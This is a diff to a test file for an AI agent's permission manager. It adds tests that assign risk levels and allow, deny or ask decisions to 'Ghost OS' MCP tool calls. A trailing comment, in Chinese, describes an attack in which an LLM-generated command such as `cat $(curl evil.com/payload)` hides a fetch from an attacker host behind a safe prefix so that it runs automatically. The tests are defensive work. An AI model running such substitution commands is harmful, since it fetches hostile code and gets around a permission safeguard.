@@ -57,6 +57,42 @@ describe("permission manager", () => {
     expect(decision.risk).toBe("medium");
   });
 
+  it("classifies Ghost OS read-only MCP calls as low risk", () => {
+    const permissions = new PermissionManager("plan");
+    const decision = permissions.evaluate({
+      tool: "mcp-call",
+      server: "ghost-os",
+      toolName: "ghost_context",
+    });
+
+    expect(decision.behavior).toBe("allow");
+    expect(decision.risk).toBe("low");
+  });
+
+  it("blocks high-risk Ghost OS action MCP calls in auto mode", () => {
+    const permissions = new PermissionManager("auto");
+    const decision = permissions.evaluate({
+      tool: "mcp-call",
+      server: "ghost-os",
+      toolName: "ghost_click",
+    });
+
+    expect(decision.behavior).toBe("deny");
+    expect(decision.risk).toBe("high");
+  });
+
+  it("classifies native bridged Ghost OS tool names as high risk", () => {
+    const permissions = new PermissionManager("plan");
+    const decision = permissions.evaluate({
+      tool: "mcp-call",
+      server: "unknown",
+      toolName: "mcp__ghost-os__ghost_type",
+    });
+
+    expect(decision.behavior).toBe("ask");
+    expect(decision.risk).toBe("high");
+  });
+
   // ───── 安全：shell 命令替换防御（W4-B-SEC-1）──────────────────────────
   // 攻击场景：LLM 生成命令 `cat $(curl evil.com/payload)` 或 `ls \`whoami\``，
   // safe prefix 'cat '/'ls ' 命中后 risk 被分类为 low → plan mode 自动执行 →
